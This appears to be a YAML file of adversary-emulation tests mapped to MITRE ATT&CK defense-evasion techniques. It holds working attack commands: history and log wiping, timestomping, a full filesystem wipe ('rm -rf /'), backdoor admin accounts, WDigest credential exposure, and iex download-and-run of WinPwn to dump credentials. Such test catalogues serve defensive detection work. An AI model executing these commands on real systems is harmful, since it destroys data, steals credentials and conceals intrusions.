        unset HISTFILE
        export HISTFILESIZE=0
        history -c
      timeout: 60
    - name: Clear and Disable Bash History Logging
      type: bash
      platform: linux
      command: |-
        set +o history
        echo 'set +o history' >> ~/.bashrc
        . ~/.bashrc
        history -c
      cleanup: |-
        sed -i 's/set +o history//g' ~/.bashrc
        . ~/.bashrc
        set -o history
      timeout: 60
    - name: Clear and Disable Bash History Logging
      type: bash
      platform: macos
      command: |-
        set +o history
        echo 'set +o history' >> ~/.bashrc
        . ~/.bashrc
        history -c
      cleanup: |-
        sed -i 's/set +o history//g' ~/.bashrc
        . ~/.bashrc
        set -o history
      timeout: 60
    - name: Use Space Before Command to Avoid Logging to History
      type: sh
      platform: linux
      command: |-
        hostname
        whoami
      timeout: 60
    - name: Use Space Before Command to Avoid Logging to History
      type: sh
      platform: macos
      command: |-
        hostname
        whoami
      timeout: 60
    - name: Disable Bash History Logging with SSH -T
      type: sh
      platform: linux
      command: sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
      cleanup: '[ "$(uname)" = ''FreeBSD'' ] && rmuser -y testuser1 || userdel -f testuser1'
      timeout: 60
    - name: Clear Docker Container Logs
      type: bash
      platform: linux
      command: docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log
      timeout: 60
      elevation_required: true
    - name: Prevent Powershell History Logging
      type: powershell
      platform: windows
      command: Set-PSReadlineOption -HistorySaveStyle SaveNothing
      cleanup: Set-PSReadLineOption -HistorySaveStyle SaveIncrementally
      timeout: 120
    - name: Clear Powershell History by Deleting History File
      type: powershell
      platform: windows
      command: Remove-Item (Get-PSReadlineOption).HistorySavePath
      timeout: 120
    - name: Set Custom AddToHistoryHandler to Avoid History File Logging
      type: powershell
      platform: windows
      command: Set-PSReadLineOption -AddToHistoryHandler { return $false }
      cleanup: Set-PSReadLineOption -AddToHistoryHandler $null
      timeout: 120
    - name: Clear PowerShell Session History
      type: powershell
      platform: windows
      command: Clear-History
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1070/003
  is_safe: false
- id: T1070.004
  name: File Deletion
  description: |-
    Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

    There are tools available from the host operatin...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Delete a single file - FreeBSD/Linux/macOS
      type: sh
      platform: linux
      command: rm -f /tmp/victim-files/T1070.004-test.txt
      cleanup: rm -rf /tmp/victim-files/
      timeout: 60
    - name: Delete a single file - FreeBSD/Linux/macOS
      type: sh
      platform: macos
      command: rm -f /tmp/victim-files/T1070.004-test.txt
      cleanup: rm -rf /tmp/victim-files/
      timeout: 60
    - name: Delete an entire folder - FreeBSD/Linux/macOS
      type: sh
      platform: linux
      command: rm -rf /tmp/victim-folder
      timeout: 60
    - name: Delete an entire folder - FreeBSD/Linux/macOS
      type: sh
      platform: macos
      command: rm -rf /tmp/victim-folder
      timeout: 60
    - name: Overwrite and delete a file with shred
      type: sh
      platform: linux
      command: shred -u /tmp/victim-shred.txt
      timeout: 60
    - name: Delete a single file - Windows cmd
      type: cmd
      platform: windows
      command: del /f %temp%\deleteme_T1551.004
      timeout: 120
    - name: Delete an entire folder - Windows cmd
      type: cmd
      platform: windows
      command: rmdir /s /q %temp%\deleteme_T1551.004
      timeout: 120
    - name: Delete a single file - Windows PowerShell
      type: powershell
      platform: windows
      command: Remove-Item -path $env:TEMP\deleteme_T1551.004
      timeout: 120
    - name: Delete an entire folder - Windows PowerShell
      type: powershell
      platform: windows
      command: Remove-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Recurse
      timeout: 120
    - name: Delete Filesystem - Linux
      type: sh
      platform: linux
      command: '[ "$(uname)" = ''Linux'' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null'
      timeout: 60
    - name: Delete Prefetch File
      type: powershell
      platform: windows
      command: Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
      timeout: 120
      elevation_required: true
    - name: Delete TeamViewer Log Files
      type: powershell
      platform: windows
      command: |-
        New-Item -Path $env:TEMP\TeamViewer_54.log -Force | Out-Null
        Remove-Item $env:TEMP\TeamViewer_54.log -Force -ErrorAction Ignore
      timeout: 120
    - name: Clears Recycle bin via rd
      type: cmd
      platform: windows
      command: rd /s /q %systemdrive%\$RECYCLE.BIN
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/004
  is_safe: false
- id: T1070.005
  name: Network Share Connection Removal
  description: 'Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use)'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Add Network Share
      type: cmd
      platform: windows
      command: |-
        net use c: \\test\share
        net share test=\\test\share /REMARK:"test share" /CACHE:No
      timeout: 120
    - name: Remove Network Share
      type: cmd
      platform: windows
      command: net share \\test\share /delete
      timeout: 120
    - name: Remove Network Share PowerShell
      type: powershell
      platform: windows
      command: |-
        Remove-SmbShare -Name \\test\share
        Remove-FileShare -Name \\test\share
      timeout: 120
    - name: Disable Administrative Share Creation at Startup
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f
      cleanup: |-
        reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /f
        reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /f
      timeout: 120
      elevation_required: true
    - name: Remove Administrative Shares
      type: cmd
      platform: windows
      command: for %i in (C$ IPC$ ADMIN$) do net share %i /delete
      cleanup: |-
        net share ADMIN$ /UNLIMITED >nul 2>&1
        net share C$=C:\ >nul 2>&1
        net share IPC$ >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/005
  is_safe: false
- id: T1070.006
  name: Timestomp
  description: |-
    Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.

    In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (da...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Set a file's access timestamp
      type: sh
      platform: linux
      command: touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
      cleanup: rm -f /tmp/T1070.006-access.txt
      timeout: 60
    - name: Set a file's access timestamp
      type: sh
      platform: macos
      command: touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
      cleanup: rm -f /tmp/T1070.006-access.txt
      timeout: 60
    - name: Set a file's modification timestamp
      type: sh
      platform: linux
      command: touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt
      cleanup: rm -f /tmp/T1070.006-modification.txt
      timeout: 60
    - name: Set a file's modification timestamp
      type: sh
      platform: macos
      command: touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt
      cleanup: rm -f /tmp/T1070.006-modification.txt
      timeout: 60
    - name: Set a file's creation timestamp
      type: sh
      platform: linux
      command: |-
        NOW=$(date +%m%d%H%M%Y)
        date 010100001971
        touch /tmp/T1070.006-creation.txt
        date "$NOW"
        stat /tmp/T1070.006-creation.txt
      cleanup: rm -f /tmp/T1070.006-creation.txt
      timeout: 60
      elevation_required: true
    - name: Set a file's creation timestamp
      type: sh
      platform: macos
      command: |-
        NOW=$(date +%m%d%H%M%Y)
        date 010100001971
        touch /tmp/T1070.006-creation.txt
        date "$NOW"
        stat /tmp/T1070.006-creation.txt
      cleanup: rm -f /tmp/T1070.006-creation.txt
      timeout: 60
      elevation_required: true
    - name: Modify file timestamps using reference file
      type: sh
      platform: linux
      command: |-
        touch /tmp/T1070.006-reference.txt
        touch -acmr /bin/sh /tmp/T1070.006-reference.txt
      cleanup: rm -f /tmp/T1070.006-reference.txt
      timeout: 60
    - name: Modify file timestamps using reference file
      type: sh
      platform: macos
      command: |-
        touch /tmp/T1070.006-reference.txt
        touch -acmr /bin/sh /tmp/T1070.006-reference.txt
      cleanup: rm -f /tmp/T1070.006-reference.txt
      timeout: 60
    - name: Windows - Modify file creation timestamp with PowerShell
      type: powershell
      platform: windows
      command: Get-ChildItem "PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt" | % { $_.CreationTime = "01/01/1970 00:00:00" }
      timeout: 120
    - name: Windows - Modify file last modified timestamp with PowerShell
      type: powershell
      platform: windows
      command: Get-ChildItem "PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt" | % { $_.LastWriteTime = "01/01/1970 00:00:00" }
      timeout: 120
    - name: Windows - Modify file last access timestamp with PowerShell
      type: powershell
      platform: windows
      command: Get-ChildItem "PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt" | % { $_.LastAccessTime = "01/01/1970 00:00:00" }
      timeout: 120
    - name: Windows - Timestomp a File
      type: powershell
      platform: windows
      command: |-
        import-module "PathToAtomicsFolder\..\ExternalPayloads\timestomp.ps1"
        timestomp -dest "PathToAtomicsFolder\..\ExternalPayloads\kxwn.lock"
      timeout: 120
    - name: MacOS - Timestomp Date Modified
      type: sh
      platform: macos
      command: SetFile -m 01/01/1970 /tmp/T1070.006-modified.txt
      cleanup: rm -f /tmp/T1070.006-modified.txt
      timeout: 60
    - name: Event Log Manipulations- Time slipping via Powershell
      type: powershell
      platform: windows
      command: "try{ \n  Set-Date -Date (Get-Date).AddDays(3)\n  Add-Content \"$env:APPDATA\\slipDays.bak\" 3\n}\ncatch {exit 1}"
      cleanup: |-
        if(Test-Path "$env:APPDATA\slipDays.bak" ){
          foreach($line in (get-content $env:APPDATA\slipDays.bak)){
            Set-Date -Date (Get-Date).AddDays(-$line)
          }
          rm "$env:APPDATA\slipDays.bak"
        }
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/006
  is_safe: false
- id: T1070.008
  name: Clear Mailbox Data
  description: "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Copy and Delete Mailbox Data on Windows
      type: powershell
      platform: windows
      command: |-
        New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore
        Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore }
        Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
      cleanup: Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Copy and Delete Mailbox Data on Linux
      type: bash
      platform: linux
      command: mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ "$(basename "$file")" != "copy" ]; then cp -R "$file" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*
      cleanup: |-
        rm -rf /var/spool/mail/copy
        if [ -f "$(ls -A /var/spool/mail/temp)" ]; then rm /var/spool/mail/temp; fi
      timeout: 60
      elevation_required: true
    - name: Copy and Delete Mailbox Data on macOS
      type: bash
      platform: macos
      command: |-
        mkdir ~/Library/Mail/copy
        cp -R ~/Library/Mail/* ~/Library/Mail/copy
        rm -rf ~/Library/Mail/copy/*
      cleanup: rm -rf ~/Library/Mail/copy
      timeout: 60
      elevation_required: true
    - name: Copy and Modify Mailbox Data on Windows
      type: powershell
      platform: windows
      command: |-
        New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore
        Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore }
        Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -File | ForEach-Object { Add-Content -Path $_.FullName -Value "Modification for Atomic Red Test" -ErrorAction Ignore }
      cleanup: Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Copy and Modify Mailbox Data on Linux
      type: bash
      platform: linux
      command: mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ "$(basename "$file")" != "copy" ]; then cp -R "$file" /var/spool/mail/copy/; if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"; fi; fi; done
      cleanup: |-
        rm -rf /var/spool/mail/copy
        if [ -f "$(ls -A /var/spool/mail/temp)" ]; then rm /var/spool/mail/temp; fi
      timeout: 60
      elevation_required: true
    - name: Copy and Modify Mailbox Data on macOS
      type: bash
      platform: macos
      command: |-
        mkdir ~/Library/Mail/copy
        cp -R ~/Library/Mail/* ~/Library/Mail/copy
        echo "Manipulated data" > ~/Library/Mail/copy/manipulated.txt
      cleanup: rm -rf ~/Library/Mail/copy
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1070/008
  is_safe: false
- id: T1078.001
  name: Default Accounts
  description: Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in ...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - persistence
    - privilege-escalation
    - initial-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Enable Guest account with RDP capability and admin privileges
      type: cmd
      platform: windows
      command: |-
        net user guest /active:yes
        net user guest Password123!
        net localgroup Administrators guest /add
        net localgroup "Remote Desktop Users" guest /add
        reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
        reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
      cleanup: |-
        net user guest /active:no >nul 2>&1
        net localgroup Administrators guest /delete >nul 2>&1
        net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
        if 0 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
        if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
        if 0 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
      timeout: 120
      elevation_required: true
    - name: Activate Guest Account
      type: cmd
      platform: windows
      command: net user guest /active:yes
      cleanup: net user guest /active:no
      timeout: 120
      elevation_required: true
    - name: Enable Guest Account on macOS
      type: sh
      platform: macos
      command: sudo sysadminctl -guestAccount on
      cleanup: sudo sysadminctl -guestAccount off
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1078/001
  is_safe: false
- id: T1078.003
  name: Local Accounts
  description: |-
    Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

    Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - persistence
    - privilege-escalation
    - initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Create local account with admin privileges
      type: cmd
      platform: windows
      command: |-
        net user art-test /add
        net user art-test -4RTisCool!-321
        net localgroup administrators art-test /add
      cleanup: |-
        net localgroup administrators art-test /delete >nul 2>&1
        net user art-test /delete >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create local account with admin privileges - MacOS
      type: bash
      platform: macos
      command: |-
        dscl . -create /Users/AtomicUser
        dscl . -create /Users/AtomicUser UserShell /bin/bash
        dscl . -create /Users/AtomicUser RealName "Atomic User"
        dscl . -create /Users/AtomicUser UniqueID 503
        dscl . -create /Users/AtomicUser PrimaryGroupID 503
        dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
        dscl . -passwd /Users/AtomicUser mySecretPassword
        dscl . -append /Groups/admin GroupMembership AtomicUser
      cleanup: sudo dscl . -delete /Users/AtomicUser
      timeout: 60
      elevation_required: true
    - name: Create local account with admin privileges using sysadminctl utility - MacOS
      type: bash
      platform: macos
      command: sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin
      cleanup: sysadminctl interactive -deleteUser art-tester
      timeout: 60
      elevation_required: true
    - name: Enable root account using dsenableroot utility - MacOS
      type: bash
      platform: macos
      command: |-
        dsenableroot #current user
        dsenableroot -u art-tester -p art-tester -r art-root #new user
      cleanup: |-
        dsenableroot -d #current user
        dsenableroot -d -u art-tester -p art-tester #new user
      timeout: 60
      elevation_required: true
    - name: Add a new/existing user to the admin group using dseditgroup utility - macOS
      type: bash
      platform: macos
      command: dseditgroup -o edit -a art-user -t user admin
      cleanup: dseditgroup -o edit -d art-user -t user admin
      timeout: 60
      elevation_required: true
    - name: WinPwn - Loot local Credentials - powerhell kittie
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        obfuskittiedump -consoleoutput -noninteractive
      timeout: 120
      elevation_required: true
    - name: WinPwn - Loot local Credentials - Safetykatz
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        safedump -consoleoutput -noninteractive
      timeout: 120
      elevation_required: true
    - name: Create local account (Linux)
      type: bash
      platform: linux
      command: |-
        password=$(openssl passwd -1 art)
        ([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
        su art -c "whoami; exit"
      cleanup: '[ "$(uname)" = ''Linux'' ] && userdel art -rf || rmuser -y art'
      timeout: 60
      elevation_required: true
    - name: Reactivate a locked/expired account (Linux)
      type: bash
      platform: linux
      command: |-
        useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
        usermod --lock art
        usermod --expiredate "1" art
        usermod --unlock art
        usermod --expiredate "99999" art
        su -c whoami art
      cleanup: userdel -r art
      timeout: 60
      elevation_required: true
    - name: Reactivate a locked/expired account (FreeBSD)
      type: sh
      platform: linux
      command: |-
        pw useradd art -g wheel -s /bin/sh
        echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
        pw lock art
        pw usermod art -e +1d
        pw unlock art
        pw user mod art -e +99d
        su art
        whoami
        exit
      cleanup: rmuser -y art
      timeout: 60
      elevation_required: true
    - name: Login as nobody (Linux)
      type: bash
      platform: linux
      command: |-
        cat /etc/passwd |grep nobody
        chsh --shell /bin/bash nobody
        usermod --password $(openssl passwd -1 nobody) nobody
        su -c "whoami" nobody
      cleanup: |-
        chsh --shell /usr/sbin/nologin nobody
        cat /etc/passwd |grep nobody
        # -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
      timeout: 60
      elevation_required: true
    - name: Login as nobody (freebsd)
      type: sh
      platform: linux
      command: |-
        cat /etc/passwd |grep nobody
        pw usermod nobody -s /bin/sh
        echo $(openssl passwd -1 art) | pw mod user nobody -h 0
        su nobody
        whoami
        exit
      cleanup: |-
        pw usermod nobody -s /usr/sbin/nologin
        cat /etc/passwd |grep nobody
        # -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
      timeout: 60
      elevation_required: true
    - name: Use PsExec to elevate to NT Authority\SYSTEM account
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula -s %COMSPEC% /c whoami'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1078/003
  is_safe: false
- id: T1112
  name: Modify Registry
  description: |-
    Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

    Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contai...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - persistence
  platforms:
    - windows
  executors:
    - name: Modify Registry of Current User Profile - cmd
      type: cmd
      platform: windows
      command: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
      cleanup: reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f >nul 2>&1
      timeout: 120
    - name: Modify Registry of Local Machine - cmd
      type: cmd
      platform: windows
      command: reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
      cleanup: reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Modify registry to store logon credentials
      type: cmd
      platform: windows
      command: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
      cleanup: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Use Powershell to Modify registry to store logon credentials
      type: powershell
      platform: windows
      command: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
      cleanup: Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Add domain to Trusted sites Zone
      type: powershell
      platform: windows
      command: |-
        $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
        $name ="bad-subdomain"
        new-item $key -Name $name -Force
        new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
        new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
        new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
      cleanup: |-
        $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
        Remove-item  $key -Recurse -ErrorAction Ignore
      timeout: 120
    - name: Javascript in registry
      type: powershell
      platform: windows
      command: New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
      cleanup: Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -ErrorAction Ignore
      timeout: 120
    - name: Change Powershell Execution Policy to Bypass
      type: powershell
      platform: windows
      command: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
      cleanup: try { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {}
      timeout: 120
    - name: BlackByte Ransomware Registry Changes - CMD
      type: cmd
      platform: windows
      command: |-
        cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
        cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
        cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
      cleanup: |-
        reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1
        reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f >nul 2>&1
        reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: BlackByte Ransomware Registry Changes - Powershell
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
        New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
      cleanup: |-
        Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Disable Windows Registry Tool
      type: cmd
      platform: windows
      command: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
      cleanup: powershell Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Name DisableRegistryTools -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Disable Windows CMD application
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Disable Windows Task Manager application
      type: cmd
      platform: windows
      command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
      cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable Windows Notification Center
      type: cmd
      platform: windows
      command: reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
      cleanup: reg delete HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable Windows Shutdown Button
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
      cleanup: reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable Windows LogOff Button
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /f >nul 2>&1
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /f >nul 2>&1
      timeout: 120
      elevation_required: true
